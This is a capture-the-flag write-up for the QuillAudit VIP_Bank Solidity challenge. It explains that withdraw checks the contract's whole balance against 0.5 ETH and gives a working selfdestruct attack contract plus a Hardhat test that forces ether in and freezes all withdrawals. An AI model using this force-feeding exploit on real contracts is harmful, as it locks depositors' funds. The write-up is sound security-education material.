# QuillAudit CTF VIP_Bank

## Vulnerability:

The vulnerability of the VIP_Bank contract lies with the withdraw function. The withdraw function, instead of checking for the withdrawing amount to be less than 0.5 ETH, it checks for the contract balance. The contract balance is checked using this.balance. It means that if the contract balance goes over 0.5 eth, nobody will be able to withraw their balance.

There are 2 ways which can result in the contract balance to be greater than 0.5 ETH.

1. The VIP members deposit their amounts which total to be greater than 0.5 ETH.
2. The contract can be sent ETH directly.

The only way to send Ether to the VIP_Bank contract is to send it when a selfdestruct method is called from another contract. This is because VIP_Bank does not have a fallback or receive function.

## Attack Steps:

### Step 1:

Create an Attack contract like this:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract VIP_attack {
    function attack(address addr) external payable {
        selfdestruct(payable(addr));
    }
}
```

### Step 2:

Call the attack function with the address of the VIP_Bank contract as the parameter and msg.value should be greater than 0.5 ETH

### Step 3:

The VIP_Bank contract balance will be updated to a number greater than 0.5 ETH and nobody can withraw their balances.

## POC:

```jsx
require("@nomiclabs/hardhat-truffle5");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { ethers, contract } = require("hardhat");
const truffleAssert = require("truffle-assertions");
const VIP = artifacts.require("VIP_Bank.sol");
const ATT = artifacts.require("VIP_attack.sol");
contract("Splits", (accounts) => {
  let [alice, bob, carey] = accounts;
  let contractInstance;
  beforeEach(async () => {
    contractInstance = await VIP.new();
  });
  describe("Tests", () => {
    it("Normal workflow", async () => {
      //add as a VIP member
      await contractInstance.addVIP(bob);
      //checking if bob is a VIP now
      console.log(await contractInstance.VIP(bob));
      //depositing 0.04 eth
      await contractInstance.deposit({ from: bob, value: 50 });
      //checking the balance of bob in the mapping balances
      console.log(await contractInstance.balances(bob));
      //checking if the balance can be withdrawed
      await contractInstance.withdraw(50, { from: bob });
      console.log(await contractInstance.balances(bob));
    });
    it("Attack: Sending a value greater than 0.5 eth to the contract", async () => {
      await contractInstance.addVIP(bob);
      await contractInstance.deposit({ from: bob, value: 50 });
      //attack starts here
      //new attack contract instance
      attackInstance = await ATT.new();
      //calling the attack function with 1eth which is greater than 0.5eth
      await attackInstance.attack(contractInstance.address, {
        from: alice,
        value: 1000000000000000000,
      });
      var balance = (await contractInstance.contractBalance()).toString();
      console.log(balance);
      //bob tries to withdraw, but tx reverts
      await truffleAssert.reverts(contractInstance.withdraw(50, { from: bob }));
    });
  });
});
```
